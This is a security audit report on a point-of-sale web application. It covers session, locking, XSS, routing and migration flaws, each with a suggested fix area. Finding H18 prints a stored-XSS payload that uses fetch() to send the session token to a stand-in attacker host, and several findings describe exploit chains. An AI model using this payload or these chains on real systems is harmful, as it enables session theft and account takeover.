## CRITICAL FINDINGS (must fix before going live)

### C1 — `/documents/search` route crashes with 500
- **File:** `backend/app/api/routes/documents.py:18` and `:125`
- **Issue:** `@router.get('/search', response_model=list[DocumentSearchOut])` is attached to `list_documents()` which returns a paginated dict — Pydantic validation fails. The real `search()` function on line 125 has **no decorator** and is unreachable dead code.
- **Impact:** Any call to `GET /documents/search` returns HTTP 500. Cashier/Admin "Document Search" is broken in production.
- **Verified:** ✅ (file pasted)
- **Suggested fix area:** `documents.py` — reassign decorators between `list_documents` and `search`.

## HIGH FINDINGS

### H1 — Login rate-limit bypass via race condition
- **File:** `backend/app/api/routes/auth.py:login()`
- **Issue:** `failed_login_count` read+increment without `with_for_update()`.
- **Impact:** Concurrent login requests all read the same low count → brute-force lockout bypassed.
- **Verified:** ✅
- **Suggested fix area:** `auth.py:login()` — user SELECT with row lock.

### H2 — `update_user_role` missing admin reauth
- **File:** `backend/app/api/routes/admin.py:update_user_role()`
- **Issue:** Role elevation allowed without `require_admin_reauth()` — inconsistent with every other sensitive admin endpoint in the same file.
- **Impact:** Unattended admin session can elevate a cashier to ADMIN silently.
- **Verified:** ✅
- **Suggested fix area:** `admin.py:update_user_role()`.

### H3 — Logout revokes ALL sessions for the user
- **File:** `backend/app/api/routes/auth.py:logout()`
- **Issue:** `update(UserSession).where(user_id == user.id, revoked_at IS NULL)` — revokes every session, not just the calling token.
- **Impact:** Logging out on one client laptop logs the same user out of every other laptop (multi-machine shop).
- **Verified:** ✅
- **Suggested fix area:** `auth.py:logout()` — restrict to current `token_hash`.

### H4 — Session absolute expiry is actually sliding
- **File:** `backend/app/api/deps.py:current_user()`
- **Issue:** `session.expires_at = now + timedelta(hours=absolute_hours)` on every request. Configured "absolute" lifetime behaves as sliding.
- **Impact:** A continuously active session never expires — stolen token remains valid indefinitely while the user stays active.
- **Verified:** ✅
- **Suggested fix area:** `deps.py:current_user()` — store absolute expiry once in `issue_session()`, never reset it.

### H5 — Admin password reset does not revoke existing sessions
- **File:** `backend/app/api/routes/admin.py:reset_user_password_by_id()`; `backend/app/services/recovery.py:reset_cashier_by_admin()`
- **Issue:** Password changed but `UserSession` rows not revoked.
- **Impact:** Anyone holding a previously issued token keeps access after password reset.
- **Verified:** ✅
- **Suggested fix area:** `admin.py:reset_user_password_by_id()`, `recovery.py:reset_cashier_by_admin()`.

### H6 — Session settings can be weakened without reauth
- **File:** `backend/app/api/routes/session_settings.py:update_settings()`
- **Issue:** Accepts `0` for idle/absolute timeouts without `require_admin_reauth()`.
- **Impact:** Compromised admin session can disable session timeouts shop-wide.
- **Verified:** ✅
- **Suggested fix area:** `session_settings.py:update_settings()`.

### H7 — Client machine registration sends admin password over plain HTTP
- **File:** `backend/app/api/routes/machine.py:_URL_PATTERN`, `_verify_admin_on_server()`, `machine_verify_admin()`, `machine_join()`
- **Issue:** URL pattern `^https?://.+:\d+$` accepts HTTP. Admin credentials POSTed via `urllib.request` unencrypted.
- **Impact:** LAN sniffer captures admin username+password.
- **Verified:** ✅
- **Suggested fix area:** `machine.py` — restrict to HTTPS or document LAN-only risk with a code-enforced "trusted LAN" flag.

### H8 — Discount approval authorization can be reused for arbitrary sales
- **File:** `backend/app/api/routes/sales.py:create_sale()`
- **Issue:** Approval ID accepted; no check that (a) it belongs to this cashier, (b) the sale matches `approval.payload_json`, (c) it hasn't been consumed.
- **Impact:** A single approved discount can be replayed infinitely for unlimited discounted sales. UI toast even exposes the approval ID for reuse (SC-A6).
- **Verified:** ✅
- **Suggested fix area:** `sales.py:create_sale()`; consume approval in `services/approvals.py:approval_review()`.

### H9 — First-time setup publicly accessible on LAN (with race)
- **File:** `backend/app/api/routes/setup.py:setup_initialize()`
- **Issue:** No auth, no localhost restriction. `if existing_users > 0` check has no DB lock — concurrent calls race (both see 0 users, both proceed to create branch/role/admin).
- **Impact:** A LAN attacker can initialize the shop with their own admin account before the owner. Concurrent setup also creates duplicate branch/role rows.
- **Verified:** ✅ (support-chat addition: row-lock race)
- **Suggested fix area:** `setup.py:setup_initialize()` — localhost-only + `SELECT ... FOR UPDATE` or advisory lock on a setup marker.

### H10 — Purchase-cost completion can race with FIFO sales
- **File:** `backend/app/api/routes/purchases.py:complete_cost()`; `backend/app/services/purchases.py:complete_line_cost()`; `backend/app/fifo/engine.py:create_purchase_lot()` + `_reconcile_negative_stock()`
- **Issue:** Sales lock the `Item` row (`services/sales.py:_lock_item()`). Purchase cost completion locks `Purchase` and `PurchaseLine` but **not** the item. A sale creating `NEGATIVE_STOCK` allocations can run concurrently with a purchase lot creation.
- **Impact:** Sale creates a `NEGATIVE_STOCK` allocation; concurrent purchase already scanned unresolved negatives and missed the new one → purchase lot goes unreconciled → wrong FIFO cost / profit on historic sales.
- **Verified:** ✅
- **Suggested fix area:** `purchases.py:complete_cost()` — acquire `Item` row lock before creating lot.

### H11 — Recovery codes can be redeemed concurrently
- **File:** `backend/app/services/recovery.py:verify_recovery_code()`
- **Issue:** Fetch unused codes then update `used_at`, no `with_for_update()`.
- **Impact:** Two simultaneous recovery requests observe the same unused code → both issue reset tokens → both accepted.
- **Verified:** ✅
- **Suggested fix area:** `recovery.py:verify_recovery_code()` — atomic conditional `UPDATE` on the code row.

### H12 — Password reset via recovery token does not revoke sessions
- **File:** `backend/app/api/routes/auth.py:reset_password_with_token()`
- **Issue:** Password updated; `UserSession` rows left active. (Similar to H5 but different endpoint.)
- **Impact:** Old tokens remain valid after password reset.
- **Verified:** ✅
- **Suggested fix area:** `auth.py:reset_password_with_token()`.

### H13 — `pg_restore --clean` runs against a live database with active pool
- **File:** `backend/app/backup/service.py:restore_postgres_backup()`; `backend/app/api/routes/backup.py:restore()`; `backend/app/api/routes/setup.py:restore_from_file()`
- **Issue:** `db.close()` closes the current session but `Engine.dispose()` is never called. The SQLAlchemy connection pool still holds idle connections to the DB being dropped.
- **Impact:** `pg_restore --clean` may hang or fail on locked objects in production with more than one concurrent user. Restore is a data-recovery path — a failure here is dangerous.
- **Verified:** ✅
- **Suggested fix area:** `backup/service.py:restore_postgres_backup()` — dispose the engine (or terminate sessions via `pg_terminate_backend`) before invoking `pg_restore --clean`.

### H14 — CLIENT machine can silently fall back to its local backend
- **File:** `frontend/src/api/client.ts:getLocalMachineInfo()`, `resolveBaseUrlForPath()`
- **Issue:** If `/machine/identity` returns non-OK or throws, `_machineInfoCache = { role: 'SERVER', serverUrl: null }` is **permanently cached**. A CLIENT laptop then routes all business APIs to its local backend.
- **Impact:** Sales, returns, repairs written to the **wrong database**. Silent data split — the worst class of bug for a multi-laptop POS.
- **Verified:** ✅
- **Suggested fix area:** `client.ts:getLocalMachineInfo()` — fail closed for CLIENT mode; don't cache transient failures as SERVER.

### H15 — Report exports bypass CLIENT→SERVER API routing
- **File:** `frontend/src/features/pos/POSHome.tsx:ReportsTab.exportReport()`
- **Issue:** Builds URL from `import.meta.env.VITE_API_BASE` and calls raw `fetch()` — bypasses `api()`/`resolveBaseUrlForPath()`.
- **Impact:** On a CLIENT laptop, report exports hit the local backend → fail or return wrong data.
- **Verified:** ✅
- **Suggested fix area:** `POSHome.tsx:exportReport()` — use `api()` with blob response or a dedicated helper that routes via `resolveBaseUrlForPath()`.

### H16 — JWT bearer token stored in localStorage (XSS-readable)
- **File:** `frontend/src/api/client.ts:login()`, `api()`, `logout()`
- **Issue:** `ltpos_token` set/read from `localStorage`. Also duplicated in `ltpos_user` JSON.
- **Impact:** Any XSS executes `localStorage.getItem('ltpos_token')` and exfiltrates the session. Chained with H18 it becomes a live exploit path.
- **Verified:** ✅
- **Suggested fix area:** `client.ts` — move to HttpOnly cookie, or at minimum in-memory + sessionStorage fallback.

### H17 — Caller-supplied `AbortSignal` disables API timeout
- **File:** `frontend/src/api/client.ts:api()`
- **Issue:** `const controller = fetchOptions.signal ? null : new AbortController()` — if caller provides a signal, the internal 15s timeout is never armed.
- **Impact:** A caller that passes `signal` but forgets its own timeout can hang the POS client indefinitely on a stalled LAN request.
- **Verified:** ✅
- **Suggested fix area:** `client.ts:api()` — use `AbortSignal.any([callerSignal, timeoutSignal])`.

### H18 — Stored XSS via receipt / reprint HTML
- **File:** `frontend/src/features/pos/POSHome.tsx:buildReceiptHTML()`, `buildGenericReprintHTML()`; `frontend/src/features/sales/SalesHistory.tsx:printReceipt()`
- **Issue:** `l.description`, `invoice_no`, `document_type`, `document_no`, `status`, shop name/address/phone/email are interpolated into HTML and written to a popup via `w.document.write()` with **no HTML escaping**.
- **Impact:** A malicious item description (or any DB-controlled string) can inject `<img src=x onerror="fetch('http://attacker/?'+localStorage.ltpos_token)">`. When any cashier reprints a receipt, the token leaves the shop. **Chained with H16 → live session takeover.** This is the highest-confidence finding in the audit because the exploit path is fully verified end-to-end.
- **Verified:** ✅ (POSHome.tsx + SalesHistory.tsx both confirmed)
- **Suggested fix area:** All three HTML builders — escape all dynamic values (create a shared `escapeHtml()` utility).

## MEDIUM FINDINGS

### M1 — `with_for_update()` on every authenticated request serializes users
- **File:** `backend/app/api/deps.py:current_user()` locks `UserSession` on every request.
- **Impact:** Same user's parallel requests (Promise.all dashboard widgets) serialize at the DB.
- **Verified:** ✅  · **Fix area:** `deps.py:current_user()` — drop the lock, use atomic `UPDATE ... WHERE token_hash = ...`.

### M2 — Account master creation missing AuditLog entries
- **File:** `backend/app/api/routes/items.py` (`create_category`, `create_item_type`), `admin.py` (`create_expense_category`, `create_supplier`, `target()`), `session_settings.py` (`update_settings`).
- **Impact:** No audit trail for configuration changes that affect business behaviour.
- **Verified:** ✅  · **Fix area:** the listed endpoints.

### M3 — N+1 queries in item listing and inventory search
- **File:** `backend/app/api/routes/items.py:admin_list_items()`, `backend/app/api/routes/inventory.py:search_items()`.
- **Impact:** 200 items → ~400 queries. Slower admin screens as shop grows.
- **Verified:** ✅  · **Fix area:** batch `ItemBarcode`/`WarrantyDefault` via `selectinload`.

### M4 — Missing FK indexes on line-item tables
- **File:** `backend/app/models/sales.py:SaleLine`, `ReturnLine`; `backend/app/models/inventory.py:PurchaseLine`; `SaleLine.sale_id`, `PurchaseLine.purchase_id`, `ReturnLine.return_id`, `RepairPart.repair_id` have no index.
- **Impact:** Receipt reprints / detail queries scan full line tables at scale.
- **Verified:** ✅  · **Fix area:** new Alembic migration adding indexes.

### M5 — Migration 0035 is an empty bridge
- **File:** `backend/alembic/versions/0035_import_mapping_persistence.py`
- **Issue:** `upgrade()` and `downgrade()` are `pass`. Fresh installs won't get whatever tables the original (uncommitted) 0035 created.
- **Impact:** Current code doesn't use ImportMapping so no runtime impact today, but the feature can't be reintroduced without a new migration.
- **Verified:** ✅  · **Fix area:** either commit the real schema or delete the placeholder and document.

### M6 — Setup status hides DB failures as "uninitialized"
- **File:** `backend/app/api/routes/setup.py:setup_status()`
- **Issue:** Broad `except` converts DB errors into `user_count = 0`.
- **Impact:** A DB outage causes the desktop client to prompt first-run setup instead of showing an error.
- **Verified:** ✅  · **Fix area:** distinguish DB exception from empty table.

### M7 — Production validation depends on `APP_ENV` being set
- **File:** `backend/app/core/config.py`
- **Issue:** Defaults include placeholder DB URL and `secret_key = "development-only-change-me"`. `validate_production_settings()` only runs when `app_env == "production"`.
- **Impact:** A deployment that forgets `APP_ENV` runs with insecure defaults.
- **Verified:** ⚠️ Partial (call site in `main.py` not inspected)
- **Fix area:** `config.py` + startup hook — refuse to start without explicit environment.

### M8 — Manual server configuration is not persisted
- **File:** `frontend/src/api/client.ts:configureManualServer()`
- **Issue:** Verifies the URL and updates in-memory `_resolvedBaseUrl` but never calls `setManualOverride()` (already imported, unused).
- **Impact:** Manual server URL is lost on restart → user must reconfigure.
- **Verified:** ✅  · **Fix area:** `client.ts:configureManualServer()`.

### M9 — Repair creation has no idempotency key
- **File:** `frontend/src/features/repairs/RepairForm.tsx:submit()`
- **Issue:** `POST /repairs` has no key. Advance payment does (good), but the initial repair creation is exposed.
- **Impact:** A network timeout + retry creates a duplicate repair job and a duplicate repair number.
- **Verified:** ✅  · **Fix area:** `RepairForm.tsx:submit()` + backend `/repairs` endpoint — accept and enforce `idempotency_key`.

### M10 — Return creation has no idempotency key
- **File:** `frontend/src/features/returns/ReturnsWorkspace.tsx:completeReturn()`
- **Issue:** `POST /returns` has no key. (Refund payments do — good.)
- **Impact:** Partial return can be submitted twice after timeout → duplicate stock movements and refund obligations.
- **Verified:** ✅  · **Fix area:** `ReturnsWorkspace.tsx:completeReturn()` + backend.

### M11 — UTC-based `today()` in business date fields
- **File:** `frontend/src/features/pos/POSHome.tsx:today()`, `SalesHistory.tsx:today()`, `DayEnd.tsx`, `Purchases.tsx`, `WarrantyWorkspace.tsx`, `HomeDashboard.tsx`
- **Issue:** `new Date().toISOString().slice(0,10)` returns UTC date.
- **Impact:** Sri Lanka UTC+5:30 — between 00:00 and 05:30 local, defaults are one day behind. Day-End, Sales filters, Purchase dates, Reports presets start on the wrong business day.
- **Verified:** ✅  · **Fix area:** shared `todayLocal()` utility.

### M12 — Old sales list can overwrite newer filter results
- **File:** `frontend/src/features/sales/SalesHistory.tsx:fetchSales()` and the filter `useEffect`
- **Issue:** Debounce cancels the timer but not an in-flight request; no request-sequence guard.
- **Impact:** Slow response for old filter overwrites new results → cashier acts on the wrong list.
- **Verified:** ✅  · **Fix area:** `SalesHistory.tsx` — AbortController + sequence token.

### M13 — Opening a second sale can show the first sale's lines
- **File:** `frontend/src/features/sales/SalesHistory.tsx:openSale()`
- **Issue:** `selectedItem` set synchronously, then `await` detail. No request token.
- **Impact:** Rapid click A→B: header shows B, lines show A. Cashier may void/return the wrong sale.
- **Verified:** ✅  · **Fix area:** `SalesHistory.tsx:openSale()` — sequence guard.

### M14 — CLIENT identity lookup is outside the API timeout
- **File:** `frontend/src/api/client.ts:api()`, `resolveBaseUrlForPath()`, `getLocalMachineInfo()`
- **Issue:** `await resolveBaseUrlForPath(path)` executes before `api()` creates the abort timer. `getLocalMachineInfo()` fetch has no timeout.
- **Impact:** If `/machine/identity` hangs, every business API call from a CLIENT laptop hangs indefinitely.
- **Verified:** ✅  · **Fix area:** `client.ts` — wrap the identity lookup in its own timeout.

### M15 — `getLocalMachineInfo` cache has no promise lock
- **File:** `frontend/src/api/client.ts:getLocalMachineInfo()`
- **Issue:** Only a resolved-value cache; concurrent callers each fire their own `/machine/identity` request before the first resolves. (Note: `resolveBaseUrl()` does this correctly with `_initPromise`.)
- **Impact:** Duplicate fetches at startup. **Not** data loss — severity downgraded from Gemini's CRITICAL to MEDIUM.
- **Verified:** ✅  · **Fix area:** `client.ts` — cache the in-flight Promise like `_initPromise`.

### M16 — FastAPI 422 validation messages shown as raw JSON in toast
- **File:** `frontend/src/api/client.ts:errorText()`
- **Issue:** Non-string `detail` is `JSON.stringify()`-ed. Pydantic 422 returns `[{loc,msg,type}]` arrays.
- **Impact:** User sees `[{"loc":["body","quantity"],"msg":"...` instead of a readable message.
- **Verified:** ✅  · **Fix area:** `client.ts:errorText()`.

### M17 — Recovery-code rate limit loads all audit rows
- **File:** `backend/app/services/recovery.py:verify_recovery_code()`
- **Issue:** Every attempt `SELECT`s **all** `RECOVERY_CODE_INVALID_ATTEMPT` rows in the last hour and filters in Python (comment: "avoid PostgreSQL JSON .astext query issues").
- **Impact:** As `AuditLog` grows, every recovery-code attempt becomes progressively slower. Medium-term production performance risk.
- **Verified:** ✅ (support-chat addition)  · **Fix area:** indexed column for attempted username instead of JSON query.

### M18 — Recovery code is not scoped to the target user
- **File:** `backend/app/services/recovery.py:recover_admin()`
- **Issue:** Lookup by `code_hash` only — no `created_by == user.id` filter.
- **Impact:** A leaked recovery code for Admin A can reset Admin B's password (if the username is known). Reduces the "your code → your password" guarantee.
- **Verified:** ✅ (support-chat addition)  · **Fix area:** `recovery.py:recover_admin()` — add `created_by == user.id`.

### M19 — `change_password` does not revoke other sessions
- **File:** `backend/app/api/routes/auth.py:change_password()`
- **Issue:** Password updated; other `UserSession` rows stay active.
- **Impact:** If a password change was triggered because a session is compromised, the attacker keeps access.
- **Verified:** ✅ (support-chat addition)  · **Fix area:** `auth.py:change_password()` — revoke all sessions except current.

### M20 — Migration 0032 irreversibly nulls purchase payment_method
- **File:** `backend/alembic/versions/0032_purchase_no_payment_method.py`
- **Issue:** `UPDATE purchases SET payment_method = NULL`. Downgrade sets everything back to `'CASH'` — original values unrecoverable.
- **Impact:** Historical CASH/CARD/ONLINE purchase split lost.
- **Verified:** ✅ (likely intentional per docstring "Requirements 08")  · **Fix area:** manager confirmation — if intentional, document; else preserve old column.

### M21 — Inconsistent FK index coverage on repair/return paths
- **File:** `backend/app/models/sales.py:RepairPart.repair_id`, `ReturnLine.return_id`, `Payment.settlement_id`
- **Impact:** Same class as M4 — sequential scans on repair/return detail joins at scale.
- **Verified:** ✅  · **Fix area:** fold into M4's new migration.

## LOW FINDINGS

### L1 — Widespread `any` in API calls weakens compile-time checks
- **Files:** `frontend/src/api/client.ts` (`api<T = any>`, `body: any`), `POSHome.tsx` (many `api<any>`/`api<any[]>`), `RepairForm.tsx`, `SalesHistory.tsx` (partially typed, better).
- **Impact:** Response-shape drift won't be caught at compile time.
- **Verified:** ✅  · **Fix area:** define response types for critical flows (sales, returns, repairs).

### L2 — JWT stored twice in localStorage
- **File:** `frontend/src/api/client.ts:login()`
- **Issue:** `ltpos_token` holds the token; `ltpos_user` JSON also contains `access_token`.
- **Impact:** Two attack surfaces for an XSS bug instead of one. Folds into H16 fix.
- **Verified:** ✅ (support-chat addition)  · **Fix area:** `client.ts:login()` — strip token from `ltpos_user` object.

### L3 — Approval ID echoed in error toast (encourages reuse)
- **File:** `frontend/src/features/pos/POSHome.tsx:checkout()`
- **Issue:** Toast text says "retry the sale using the approval ID below" and displays the ID — this is the very workflow H8 allows to be abused.
- **Impact:** UI messaging itself pushes towards the vulnerable pattern.
- **Verified:** ✅ (support-chat addition)  · **Fix area:** after H8 fix, remove ID echo; keep only a generic "Approval requested" message.

### L4 — Dead-code idempotency-key regeneration in RepairForm
- **File:** `frontend/src/features/repairs/RepairForm.tsx:submit()`
- **Issue:** `if (advance > 0 && advanceKey.length < 8) setAdvanceKey(...)` — `crypto.randomUUID()` is 36 chars, so never executes.
- **Impact:** Code smell, no runtime effect.
- **Verified:** ✅ (support-chat addition)  · **Fix area:** remove.

## FALSE POSITIVES REJECTED

- **FP1 — ChatGPT claim:** `customer_history()` in `backend/app/api/routes/customers.py` doesn't verify branch ownership.
  **Why not real:** `Customer` model (`backend/app/models/sales.py:Customer`) has **no `branch_id` column** — customers are intentionally global. There's no ownership relation to verify. Subsequent sales/settlements/repairs queries already filter by `user.branch_id`. Not a bug.
  **Decision:** rejected. If branch-scoped customers become a requirement, that's a new feature, not a fix.
